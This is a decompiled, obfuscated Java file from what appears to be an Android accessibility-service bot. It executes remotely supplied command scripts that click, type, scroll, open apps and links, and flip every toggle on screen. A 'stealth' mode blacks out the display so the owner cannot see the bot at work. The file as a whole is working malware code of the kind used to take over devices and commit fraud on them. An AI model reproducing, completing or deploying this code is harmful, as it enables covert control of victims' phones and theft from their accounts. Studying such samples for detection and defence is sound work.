/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.accessibilityservice.AccessibilityService
 *  android.accessibilityservice.GestureDescription
 *  android.accessibilityservice.GestureDescription$Builder
 *  android.accessibilityservice.GestureDescription$StrokeDescription
 *  android.content.Context
 *  android.content.Intent
 *  android.graphics.Path
 *  android.graphics.Rect
 *  android.net.Uri
 *  android.os.Build$VERSION
 *  android.view.accessibility.AccessibilityNodeInfo
 */
package linker.resourcer.encoder;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.Context;
import android.content.Intent;
import android.graphics.Path;
import android.graphics.Rect;
import android.net.Uri;
import android.os.Build;
import android.view.accessibility.AccessibilityNodeInfo;
import java.text.Normalizer;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import linker.resourcer.encoder.elwxjqxcxhcpntga;
import linker.resourcer.encoder.ffbrxjknfnpfxahr;
import linker.resourcer.encoder.jhvbzpdwpbqgticwdxuva;
import linker.resourcer.encoder.maagohqzehyoivaxlfkohrpeu;

public class CommandProcessor {
    private static CommandProcessor singlerinst = null;
    private volatile String LastActivebot = "N/A";
    private jhvbzpdwpbqgticwdxuva My_Access;
    private volatile boolean abortRequested = false;
    private Map<String, ActionHandler> actionMap;
    private volatile BotState currentState = BotState.WAITING;
    private long postActionDelayMs = 1000L;

    private CommandProcessor() {
    }

    public static CommandProcessor getinstance(jhvbzpdwpbqgticwdxuva jhvbzpdwpbqgticwdxuva2) {
        if (singlerinst != null) {
            return singlerinst;
        }
        singlerinst = new CommandProcessor();
        CommandProcessor.singlerinst.actionMap = new HashMap<String, ActionHandler>();
        CommandProcessor.singlerinst.actionMap.put("click", new ClickHandler());
        CommandProcessor.singlerinst.actionMap.put("sleep", new SleepHandler());
        CommandProcessor.singlerinst.actionMap.put("scroll", new ScrollHandler());
        CommandProcessor.singlerinst.actionMap.put("open", new OpenHandler());
        CommandProcessor.singlerinst.actionMap.put("openlink", new OpenLinkHandler());
        CommandProcessor.singlerinst.actionMap.put("navigate", new NavigateHandler());
        CommandProcessor.singlerinst.actionMap.put("pasteit", new InputTextHandler());
        CommandProcessor.singlerinst.actionMap.put("stealth", new stealthHandler());
        CommandProcessor.singlerinst.actionMap.put("waitfor", new WaitHandler(singlerinst));
        CommandProcessor.singlerinst.actionMap.put("check", new TogglesHandler());
        CommandProcessor.singlerinst.My_Access = jhvbzpdwpbqgticwdxuva2;
        return singlerinst;
    }

    private void processLines(List<String> list, int n, int n2) {
        while (n < n2) {
            block19: {
                block22: {
                    Object object;
                    String string2;
                    block21: {
                        int n3;
                        int n4;
                        int n5;
                        int n6;
                        int n7;
                        int n8;
                        block20: {
                            if (this.abortRequested) {
                                maagohqzehyoivaxlfkohrpeu.Debug("bot process", "Execution stopped.");
                                return;
                            }
                            string2 = list.get(n).trim();
                            if (string2.isEmpty()) break block19;
                            object = string2.split("<S>", 2);
                            if (((String[])object).length >= 2) break block20;
                            maagohqzehyoivaxlfkohrpeu.Debug("Invalid command: ", string2);
                            break block19;
                        }
                        string2 = object[0].trim().toLowerCase();
                        object = object[1].trim();
                        if (!string2.equals("repeat")) break block21;
                        try {
                            n8 = Integer.parseInt((String)object);
                            n7 = n + 1;
                            n6 = -1;
                            n5 = 0;
                            n4 = n7;
                        }
                        catch (NumberFormatException numberFormatException) {
                            maagohqzehyoivaxlfkohrpeu.Debug("Invalid repeat count: ", (String)object);
                        }
                        while (true) {
                            n3 = n6;
                            if (n4 >= n2) break;
                            string2 = list.get(n4).trim().toLowerCase();
                            if (string2.contains("<s>")) {
                                string2 = string2.split("<s>", 2)[0];
                            }
                            if (string2.equals("repeat")) {
                                n3 = n5 + 1;
                            } else {
                                n3 = n5;
                                if (string2.equals("endrepeat")) {
                                    if (n5 == 0) {
                                        n3 = n4;
                                        break;
                                    }
                                    n3 = n5 - 1;
                                }
                            }
                            ++n4;
                            n5 = n3;
                        }
                        if (n3 == -1) {
                            maagohqzehyoivaxlfkohrpeu.Debug("Missing endrepeat for repeat starting at line: ", String.valueOf(n));
                            return;
                        }
                        for (n = 0; n < n8; ++n) {
                            maagohqzehyoivaxlfkohrpeu.Debug("Repeat iteration: ", n + 1 + "/" + n8);
                            this.processLines(list, n7, n3);
                        }
                        n = n3;
                        break block22;
                        break block19;
                    }
                    if (string2.equals("endrepeat")) break block19;
                    ActionHandler actionHandler = this.actionMap.get(string2);
                    if (actionHandler != null) {
                        actionHandler.execute(this.My_Access, (String)object);
                    } else {
                        maagohqzehyoivaxlfkohrpeu.Debug("Unknown action: ", string2);
                    }
                }
                try {
                    Thread.sleep(this.postActionDelayMs);
                }
                catch (InterruptedException interruptedException) {
                    // empty catch block
                }
            }
            ++n;
        }
    }

    public void abort() {
        this.abortRequested = true;
        this.currentState = BotState.ABORTED;
        maagohqzehyoivaxlfkohrpeu.Debug("Bot abort", " execution aborted by user.");
    }

    public BotState getCurrentState() {
        return this.currentState;
    }

    public String getlastactive() {
        return this.LastActivebot;
    }

    public boolean isRunning() {
        boolean bl = this.currentState == BotState.RUNNING;
        return bl;
    }

    public void processCommands(String object, String string2) {
        if (this.isRunning()) {
            maagohqzehyoivaxlfkohrpeu.Debug("Bot start", "Bot is already running. Please wait or abort.");
            return;
        }
        this.currentState = BotState.RUNNING;
        this.LastActivebot = string2;
        this.abortRequested = false;
        try {
            object = Arrays.asList(((String)object).split("<L>"));
            this.processLines((List<String>)object, 0, object.size());
            if (!this.abortRequested) {
                this.currentState = BotState.SUCCESS;
            }
        }
        catch (Exception exception) {
            this.currentState = BotState.FAIL;
            maagohqzehyoivaxlfkohrpeu.Debug("Bot failed with exception: ", exception.getMessage());
        }
    }

    static interface ActionHandler {
        public void execute(jhvbzpdwpbqgticwdxuva var1, String var2);
    }

    public static enum BotState {
        WAITING,
        RUNNING,
        SUCCESS,
        FAIL,
        ABORTED;

    }

    static class ClickHandler
    implements ActionHandler {
        ClickHandler() {
        }

        private void clickbyclass(jhvbzpdwpbqgticwdxuva jhvbzpdwpbqgticwdxuva2, String object) {
            block5: {
                block4: {
                    Object var3_4 = null;
                    object = elwxjqxcxhcpntga.getNodesByClassName(jhvbzpdwpbqgticwdxuva2.getRootInActiveWindow(), (String)object);
                    jhvbzpdwpbqgticwdxuva2 = var3_4;
                    if (object == null) break block4;
                    jhvbzpdwpbqgticwdxuva2 = var3_4;
                    if (object.isEmpty()) break block4;
                    jhvbzpdwpbqgticwdxuva2 = (AccessibilityNodeInfo)object.get(0);
                }
                if (jhvbzpdwpbqgticwdxuva2 == null) break block5;
                try {
                    object = new Rect();
                    jhvbzpdwpbqgticwdxuva2.getBoundsInScreen((Rect)object);
                    elwxjqxcxhcpntga.clickthis(object.centerX(), object.centerY());
                }
                catch (Exception exception) {
                    maagohqzehyoivaxlfkohrpeu.Error("clickbyclass", exception.getMessage());
                    exception.printStackTrace();
                }
            }
        }

        private void clickbyid(jhvbzpdwpbqgticwdxuva jhvbzpdwpbqgticwdxuva2, String string2) {
            block3: {
                jhvbzpdwpbqgticwdxuva2 = elwxjqxcxhcpntga.getNodeByViewId(jhvbzpdwpbqgticwdxuva2.getRootInActiveWindow(), string2);
                if (jhvbzpdwpbqgticwdxuva2 == null) break block3;
                try {
                    string2 = new Rect();
                    jhvbzpdwpbqgticwdxuva2.getBoundsInScreen((Rect)string2);
                    elwxjqxcxhcpntga.clickthis(string2.centerX(), string2.centerY());
                }
                catch (Exception exception) {
                    maagohqzehyoivaxlfkohrpeu.Error("clickbyid", exception.getMessage());
                    exception.printStackTrace();
                }
            }
        }

        /*
         * Unable to fully structure code
         * Enabled aggressive block sorting
         * Enabled unnecessary exception pruning
         * Enabled aggressive exception aggregation
         */
        private void clickbytext(jhvbzpdwpbqgticwdxuva var1_1, String var2_3) {
            var4_4 = var1_1.getRootInActiveWindow();
            if (var4_4 == null) {
                return;
            }
            var1_1 = ClickHandler.findNodesByTextExact((String)var2_3, (AccessibilityNodeInfo)var4_4);
            var3_5 = var1_1;
            if (var1_1.isEmpty()) {
                var3_5 = ClickHandler.findNodesByContentDescriptionExact((String)var2_3, (AccessibilityNodeInfo)var4_4);
            }
            if (var3_5.isEmpty() != false) return;
            var1_1 = null;
            var4_4 = var3_5.iterator();
            do {
                var2_3 = var1_1;
            } while (var4_4.hasNext() && ((var2_3 = (AccessibilityNodeInfo)var4_4.next()) == null || !var2_3.isVisibleToUser()));
            var1_1 = var2_3;
            if (var2_3 == null) {
                var1_1 = var3_5.get(0);
            }
            var2_3 = var1_1;
            while (var2_3 != null && !var2_3.isClickable() && var2_3.getParent() != null) {
                var4_4 = var2_3.getParent();
                if (var2_3 != var1_1) {
                    var2_3.recycle();
                }
                var2_3 = var4_4;
            }
            var5_6 = new Rect();
            var4_4 = var2_3 != null ? var2_3 : var1_1;
            var4_4.getBoundsInScreen(var5_6);
            if (!var5_6.isEmpty()) {
                elwxjqxcxhcpntga.clickthis(var5_6.centerX(), var5_6.centerY());
            }
            for (AccessibilityNodeInfo var3_5 : var3_5) {
                if (var3_5 == var1_1 || var3_5 == var2_3) continue;
                var3_5.recycle();
            }
            if (var2_3 == null || var2_3 == var1_1) ** GOTO lbl38
            try {
                var2_3.recycle();
lbl38:
                // 2 sources

                var1_1.recycle();
                return;
            }
            catch (Exception var1_2) {
                maagohqzehyoivaxlfkohrpeu.Error("clickbytext", var1_2.getMessage());
                var1_2.printStackTrace();
            }
        }

        private static boolean equalsWholeStrict(CharSequence charSequence, String string2) {
            charSequence = ClickHandler.normalizeStrict(charSequence);
            boolean bl = !(string2 = ClickHandler.normalizeStrict(string2)).isEmpty() && ((String)charSequence).equals(string2);
            return bl;
        }

        public static List<AccessibilityNodeInfo> findNodesByContentDescriptionExact(String string2, AccessibilityNodeInfo accessibilityNodeInfo) {
            ArrayList<AccessibilityNodeInfo> arrayList = new ArrayList<AccessibilityNodeInfo>();
            if (accessibilityNodeInfo == null) {
                return arrayList;
            }
            ArrayDeque<AccessibilityNodeInfo> arrayDeque = new ArrayDeque<AccessibilityNodeInfo>();
            arrayDeque.add(AccessibilityNodeInfo.obtain((AccessibilityNodeInfo)accessibilityNodeInfo));
            while (!arrayDeque.isEmpty()) {
                int n;
                accessibilityNodeInfo = (AccessibilityNodeInfo)arrayDeque.removeFirst();
                try {
                    if (ClickHandler.equalsWholeStrict(accessibilityNodeInfo.getContentDescription(), string2)) {
                        arrayList.add(AccessibilityNodeInfo.obtain((AccessibilityNodeInfo)accessibilityNodeInfo));
                    }
                    n = 0;
                }
                catch (Throwable throwable) {
                    accessibilityNodeInfo.recycle();
                    throw throwable;
                }
                while (true) {
                    block8: {
                        if (n >= accessibilityNodeInfo.getChildCount()) break;
                        AccessibilityNodeInfo accessibilityNodeInfo2 = accessibilityNodeInfo.getChild(n);
                        if (accessibilityNodeInfo2 == null) break block8;
                        arrayDeque.add(accessibilityNodeInfo2);
                    }
                    ++n;
                }
                accessibilityNodeInfo.recycle();
            }
            return arrayList;
        }

        public static List<AccessibilityNodeInfo> findNodesByTextExact(String string2, AccessibilityNodeInfo accessibilityNodeInfo) {
            ArrayList<AccessibilityNodeInfo> arrayList = new ArrayList<AccessibilityNodeInfo>();
            if (accessibilityNodeInfo == null) {
                return arrayList;
            }
            ArrayDeque<AccessibilityNodeInfo> arrayDeque = new ArrayDeque<AccessibilityNodeInfo>();
            arrayDeque.add(AccessibilityNodeInfo.obtain((AccessibilityNodeInfo)accessibilityNodeInfo));
            while (!arrayDeque.isEmpty()) {
                int n;
                accessibilityNodeInfo = (AccessibilityNodeInfo)arrayDeque.removeFirst();
                try {
                    if (ClickHandler.equalsWholeStrict(accessibilityNodeInfo.getText(), string2)) {
                        arrayList.add(AccessibilityNodeInfo.obtain((AccessibilityNodeInfo)accessibilityNodeInfo));
                    } else if (Build.VERSION.SDK_INT >= 26 && ClickHandler.equalsWholeStrict(accessibilityNodeInfo.getHintText(), string2)) {
                        arrayList.add(AccessibilityNodeInfo.obtain((AccessibilityNodeInfo)accessibilityNodeInfo));
                    } else if (ClickHandler.equalsWholeStrict(accessibilityNodeInfo.getContentDescription(), string2)) {
                        arrayList.add(AccessibilityNodeInfo.obtain((AccessibilityNodeInfo)accessibilityNodeInfo));
                    }
                    n = 0;
                }
                catch (Throwable throwable) {
                    accessibilityNodeInfo.recycle();
                    throw throwable;
                }
                while (true) {
                    block12: {
                        if (n >= accessibilityNodeInfo.getChildCount()) break;
                        AccessibilityNodeInfo accessibilityNodeInfo2 = accessibilityNodeInfo.getChild(n);
                        if (accessibilityNodeInfo2 == null) break block12;
                        arrayDeque.add(accessibilityNodeInfo2);
                    }
                    ++n;
                }
                accessibilityNodeInfo.recycle();
            }
            return arrayList;
        }

        private static String normalizeStrict(CharSequence charSequence) {
            if (charSequence == null) {
                return "";
            }
            return Normalizer.normalize(((Object)charSequence).toString().replace('\u2019', '\'').replace('\u2018', '\'').replace('\u201c', '\"').replace('\u201d', '\"').replace("\u200b", "").replace("\u200c", "").replace("\u200d", "").replace("\u2060", "").replace('\u00a0', ' '), Normalizer.Form.NFKD).replaceAll("\\p{M}+", "").replaceAll("[^\\p{L}\\p{Nd}\\s]", "").replaceAll("\\s+", " ").trim();
        }

        /*
         * Enabled aggressive block sorting
         * Enabled unnecessary exception pruning
         * Enabled aggressive exception aggregation
         */
        @Override
        public void execute(jhvbzpdwpbqgticwdxuva jhvbzpdwpbqgticwdxuva2, String string2) {
            int n;
            String[] stringArray;
            block14: {
                maagohqzehyoivaxlfkohrpeu.Debug("Clicking on: ", string2);
                stringArray = string2.split("<ARG>");
                n = 0;
                string2 = stringArray[0];
                switch (string2.hashCode()) {
                    case 84: {
                        if (!string2.equals("T")) break;
                        break block14;
                    }
                    case 76: {
                        if (!string2.equals("L")) break;
                        n = 3;
                        break block14;
                    }
                    case 73: {
                        if (!string2.equals("I")) break;
                        n = 1;
                        break block14;
                    }
                    case 67: {
                        if (!string2.equals("C")) break;
                        n = 2;
                        break block14;
                    }
                }
                n = -1;
            }
            switch (n) {
                default: {
                    return;
                }
                case 3: {
                    if (stringArray.length < 3) return;
                    try {
                        elwxjqxcxhcpntga.clickthis(Integer.parseInt(stringArray[1]), Integer.parseInt(stringArray[2]));
                        return;
                    }
                    catch (NumberFormatException numberFormatException) {
                        maagohqzehyoivaxlfkohrpeu.Error("clickbylocation", "Invalid coordinates: " + numberFormatException.getMessage());
                        return;
                    }
                }
                case 2: {
                    this.clickbyclass(jhvbzpdwpbqgticwdxuva2, stringArray[1]);
                    return;
                }
                case 1: {
                    this.clickbyid(jhvbzpdwpbqgticwdxuva2, stringArray[1]);
                    return;
                }
                case 0: 
            }
            this.clickbytext(jhvbzpdwpbqgticwdxuva2, stringArray[1]);
        }
    }

    static class InputTextHandler
    implements ActionHandler {
        InputTextHandler() {
        }

        @Override
        public void execute(jhvbzpdwpbqgticwdxuva jhvbzpdwpbqgticwdxuva2, String string2) {
            maagohqzehyoivaxlfkohrpeu.Debug("InputText ", string2);
            elwxjqxcxhcpntga.pasteText(string2);
        }
    }

    static class NavigateHandler
    implements ActionHandler {
        NavigateHandler() {
        }

        /*
         * Enabled aggressive block sorting
         */
        @Override
        public void execute(jhvbzpdwpbqgticwdxuva jhvbzpdwpbqgticwdxuva2, String string2) {
            int n;
            block10: {
                maagohqzehyoivaxlfkohrpeu.Debug("Navigate ", string2);
                switch (string2.hashCode()) {
                    case 82: {
                        if (!string2.equals("R")) break;
                        n = 1;
                        break block10;
                    }
                    case 72: {
                        if (!string2.equals("H")) break;
                        n = 0;
                        break block10;
                    }
                    case 66: {
                        if (!string2.equals("B")) break;
                        n = 2;
                        break block10;
                    }
                }
                n = -1;
            }
            switch (n) {
                default: {
                    return;
                }
                case 2: {
                    jhvbzpdwpbqgticwdxuva2.performGlobalAction(1);
                    return;
                }
                case 1: {
                    jhvbzpdwpbqgticwdxuva2.performGlobalAction(3);
                    return;
                }
                case 0: 
            }
            jhvbzpdwpbqgticwdxuva2.performGlobalAction(2);
        }
    }

    static class OpenHandler
    implements ActionHandler {
        OpenHandler() {
        }

        @Override
        public void execute(jhvbzpdwpbqgticwdxuva jhvbzpdwpbqgticwdxuva2, String string2) {
            maagohqzehyoivaxlfkohrpeu.Debug("Open ", string2);
            ffbrxjknfnpfxahr.openAppByPackageName(jhvbzpdwpbqgticwdxuva2.getApplicationContext(), string2);
        }
    }

    static class OpenLinkHandler
    implements ActionHandler {
        OpenLinkHandler() {
        }

        private void openLinkInApp(Context context, String string2, String string3) {
            try {
                Intent intent = new Intent("android.intent.action.VIEW", Uri.parse((String)string2));
                intent.setPackage(string3);
                intent.addFlags(0x10000000);
                context.startActivity(intent);
            }
            catch (Exception exception) {
                maagohqzehyoivaxlfkohrpeu.Error("OpenLinkH", "Failed to open app: " + exception.getMessage());
            }
        }

        private void openLinkInBrowser(Context context, String string2) {
            try {
                Intent intent = new Intent("android.intent.action.VIEW", Uri.parse((String)string2));
                intent.addFlags(0x10000000);
                context.startActivity(intent);
            }
            catch (Exception exception) {
                maagohqzehyoivaxlfkohrpeu.Error("OpenLinkH", "Failed to open browser: " + exception.getMessage());
            }
        }

        @Override
        public void execute(jhvbzpdwpbqgticwdxuva object, String string2) {
            maagohqzehyoivaxlfkohrpeu.Debug("Open", string2);
            try {
                String[] stringArray = string2.split("<ARG>");
                if (stringArray.length < 2) {
                    maagohqzehyoivaxlfkohrpeu.Error("OpenLinkH", "Invalid argument format: too few parts");
                    return;
                }
                string2 = ffbrxjknfnpfxahr.Safeurl(stringArray[0]);
                String string3 = stringArray[1].trim().toLowerCase();
                if ("app".equals(string3)) {
                    if (stringArray.length < 3) {
                        maagohqzehyoivaxlfkohrpeu.Error("OpenLinkH", "App mode requires package name");
                        return;
                    }
                    string3 = stringArray[2].trim();
                    this.openLinkInApp(object.getApplicationContext(), string2, string3);
                } else if ("browser".equals(string3)) {
                    this.openLinkInBrowser(object.getApplicationContext(), string2);
                } else {
                    object = new StringBuilder();
                    maagohqzehyoivaxlfkohrpeu.Error("OpenLinkH", ((StringBuilder)object).append("Unknown target type: ").append(string3).toString());
                }
            }
            catch (Exception exception) {
                maagohqzehyoivaxlfkohrpeu.Error("OpenLinkH", "Error executing open link: " + exception.getMessage());
                exception.printStackTrace();
            }
        }
    }

    static class ScrollHandler
    implements ActionHandler {
        ScrollHandler() {
        }

        private void performSwipe(AccessibilityService accessibilityService, int n, int n2, int n3, int n4, long l) {
            try {
                Path path2 = new Path();
                path2.moveTo((float)n, (float)n2);
                path2.lineTo((float)n3, (float)n4);
                GestureDescription.StrokeDescription strokeDescription = new GestureDescription.StrokeDescription(path2, 0L, l);
                path2 = new GestureDescription.Builder();
                path2.addStroke(strokeDescription);
                strokeDescription = path2.build();
                if (accessibilityService instanceof jhvbzpdwpbqgticwdxuva) {
                    elwxjqxcxhcpntga.smartDispatch((jhvbzpdwpbqgticwdxuva)accessibilityService, (GestureDescription)strokeDescription, null);
                } else {
                    accessibilityService.dispatchGesture((GestureDescription)strokeDescription, null, null);
                }
                maagohqzehyoivaxlfkohrpeu.Debug("ScrollHandler", "Gesture dispatched");
            }
            catch (Exception exception) {
                maagohqzehyoivaxlfkohrpeu.Error("performSwipe", exception.getMessage());
                exception.printStackTrace();
            }
        }

        /*
         * Enabled aggressive block sorting
         */
        @Override
        public void execute(jhvbzpdwpbqgticwdxuva jhvbzpdwpbqgticwdxuva2, String string2) {
            int n;
            block12: {
                maagohqzehyoivaxlfkohrpeu.Debug("Scrolling ", string2);
                switch (string2.hashCode()) {
                    case 85: {
                        if (!string2.equals("U")) break;
                        n = 0;
                        break block12;
                    }
                    case 82: {
                        if (!string2.equals("R")) break;
                        n = 3;
                        break block12;
                    }
                    case 76: {
                        if (!string2.equals("L")) break;
                        n = 2;
                        break block12;
                    }
                    case 68: {
                        if (!string2.equals("D")) break;
                        n = 1;
                        break block12;
                    }
                }
                n = -1;
            }
            switch (n) {
                default: {
                    maagohqzehyoivaxlfkohrpeu.Error("ScrollHandler", "Unknown scroll direction: " + string2);
                    return;
                }
                case 3: {
                    this.performSwipe(jhvbzpdwpbqgticwdxuva2, 200, 800, 900, 800, 300L);
                    return;
                }
                case 2: {
                    this.performSwipe(jhvbzpdwpbqgticwdxuva2, 900, 800, 200, 800, 300L);
                    return;
                }
                case 1: {
                    this.performSwipe(jhvbzpdwpbqgticwdxuva2, 500, 600, 500, 200, 300L);
                    return;
                }
                case 0: 
            }
            this.performSwipe(jhvbzpdwpbqgticwdxuva2, 200, 200, 200, 600, 300L);
        }
    }

    static class SleepHandler
    implements ActionHandler {
        SleepHandler() {
        }

        @Override
        public void execute(jhvbzpdwpbqgticwdxuva object, String string2) {
            try {
                long l = Long.parseLong(string2.trim());
                object = new StringBuilder();
                maagohqzehyoivaxlfkohrpeu.Debug("Sleeping for: ", ((StringBuilder)object).append(l).append(" ms").toString());
                Thread.sleep(l);
            }
            catch (InterruptedException interruptedException) {
                Thread.currentThread().interrupt();
            }
        }
    }

    static class TogglesHandler
    implements ActionHandler {
        TogglesHandler() {
        }

        private void customcheck(jhvbzpdwpbqgticwdxuva object, boolean bl, String string2) {
            block7: {
                object = elwxjqxcxhcpntga.getNodesByClassName(object.getRootInActiveWindow(), string2);
                if (object == null) break block7;
                try {
                    if (object.size() <= 0) break block7;
                    object = object.iterator();
                    while (object.hasNext()) {
                        string2 = (AccessibilityNodeInfo)object.next();
                        if (!string2.isCheckable() || string2.isChecked() == bl) continue;
                        if (string2.isClickable()) {
                            string2.performAction(16);
                            break;
                        }
                        Rect rect = new Rect();
                        string2.getBoundsInScreen(rect);
                        elwxjqxcxhcpntga.clickthis((int)rect.exactCenterX(), (int)rect.exactCenterY());
                    }
                }
                catch (Exception exception) {
                    maagohqzehyoivaxlfkohrpeu.Error("setAllCheckables", exception.getMessage());
                    exception.printStackTrace();
                }
                {
                    try {
                        Thread.sleep(100L);
                    }
                    catch (Exception exception) {}
                    continue;
                    break;
                }
            }
            maagohqzehyoivaxlfkohrpeu.Debug("setAllCheckables", "allon=" + bl);
        }

        /*
         * Enabled aggressive block sorting
         * Enabled unnecessary exception pruning
         * Enabled aggressive exception aggregation
         */
        private void setAllCheckables(jhvbzpdwpbqgticwdxuva jhvbzpdwpbqgticwdxuva2, boolean bl) {
            String[] stringArray = new String[3];
            stringArray[0] = "android.widget.CheckBox";
            stringArray[1] = "android.widget.Switch";
            stringArray[2] = "android.view.View";
            for (String string2 : stringArray) {
                Iterator<AccessibilityNodeInfo> iterator2;
                block10: {
                    try {
                        List<AccessibilityNodeInfo> list = elwxjqxcxhcpntga.getNodesByClassName(jhvbzpdwpbqgticwdxuva2.getRootInActiveWindow(), string2);
                        if (list == null || list.size() <= 0) continue;
                        iterator2 = list.iterator();
                        break block10;
                    }
                    catch (Exception exception) {
                        maagohqzehyoivaxlfkohrpeu.Error("setAllCheckables", exception.getMessage());
                        exception.printStackTrace();
                    }
                    break;
                }
                while (iterator2.hasNext()) {
                    AccessibilityNodeInfo accessibilityNodeInfo = iterator2.next();
                    if (!accessibilityNodeInfo.isCheckable() || accessibilityNodeInfo.isChecked() == bl) continue;
                    if (accessibilityNodeInfo.isClickable()) {
                        accessibilityNodeInfo.performAction(16);
                    } else {
                        Rect rect = new Rect();
                        accessibilityNodeInfo.getBoundsInScreen(rect);
                        elwxjqxcxhcpntga.clickthis((int)rect.exactCenterX(), (int)rect.exactCenterY());
                    }
                    try {
                        Thread.sleep(100L);
                    }
                    catch (Exception exception) {}
                }
            }
            maagohqzehyoivaxlfkohrpeu.Debug("setAllCheckables", "allon=" + bl);
        }

        @Override
        public void execute(jhvbzpdwpbqgticwdxuva jhvbzpdwpbqgticwdxuva2, String string2) {
            maagohqzehyoivaxlfkohrpeu.Debug("toggle ", string2);
            if (string2.startsWith("alloff")) {
                this.setAllCheckables(jhvbzpdwpbqgticwdxuva2, false);
            } else if (string2.startsWith("allon")) {
                this.setAllCheckables(jhvbzpdwpbqgticwdxuva2, true);
            } else if (string2.startsWith("id")) {
                Object object = string2.split("<ARG>");
                string2 = object[1];
                if (((String)(object = object[2])).equals("on")) {
                    this.customcheck(jhvbzpdwpbqgticwdxuva2, true, string2);
                } else if (((String)object).equals("off")) {
                    this.customcheck(jhvbzpdwpbqgticwdxuva2, true, string2);
                }
            }
        }
    }

    static class WaitHandler
    implements ActionHandler {
        CommandProcessor instanse;

        public WaitHandler(CommandProcessor commandProcessor) {
            this.instanse = commandProcessor;
        }

        @Override
        public void execute(jhvbzpdwpbqgticwdxuva jhvbzpdwpbqgticwdxuva2, String object) {
            block11: {
                boolean bl;
                Object object2;
                block10: {
                    boolean bl2;
                    maagohqzehyoivaxlfkohrpeu.Debug("WaitHandler ", (String)object);
                    object = object.split("<ARG>");
                    object2 = object[0];
                    object = object[1];
                    if (!((String)object2).equals("Tx")) break block10;
                    do {
                        bl2 = (object2 = elwxjqxcxhcpntga.findNodesByText((String)object, jhvbzpdwpbqgticwdxuva2.getRootInActiveWindow())) != null && !object2.isEmpty();
                        if (this.instanse.abortRequested) {
                            maagohqzehyoivaxlfkohrpeu.Debug("bot process", "Execution stopped.");
                            return;
                        }
                        if (bl2) continue;
                        try {
                            Thread.sleep(3000L);
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                    } while (!bl2);
                    break block11;
                }
                if (!((String)object2).equals("Ap")) break block11;
                boolean bl3 = false;
                do {
                    object2 = jhvbzpdwpbqgticwdxuva2.getRootInActiveWindow();
                    bl = bl3;
                    if (object2 != null) {
                        bl = (object2 = object2.getPackageName()) != null && object2.toString().equalsIgnoreCase((String)object);
                    }
                    if (this.instanse.abortRequested) {
                        maagohqzehyoivaxlfkohrpeu.Debug("bot process", "Execution stopped.");
                        return;
                    }
                    if (!bl) {
                        try {
                            Thread.sleep(3000L);
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                    }
                    bl3 = bl;
                } while (!bl);
            }
        }
    }

    static class stealthHandler
    implements ActionHandler {
        stealthHandler() {
        }

        @Override
        public void execute(jhvbzpdwpbqgticwdxuva jhvbzpdwpbqgticwdxuva2, String string2) {
            maagohqzehyoivaxlfkohrpeu.Debug("stealth ", string2);
            if (!string2.equals("on") && !string2.equals("on_block")) {
                if (string2.equals("on_control")) {
                    elwxjqxcxhcpntga.BlackScreen(true, false);
                } else if (string2.equals("off")) {
                    elwxjqxcxhcpntga.BlackScreen(false);
                }
            } else {
                elwxjqxcxhcpntga.BlackScreen(true, true);
            }
        }
    }
}

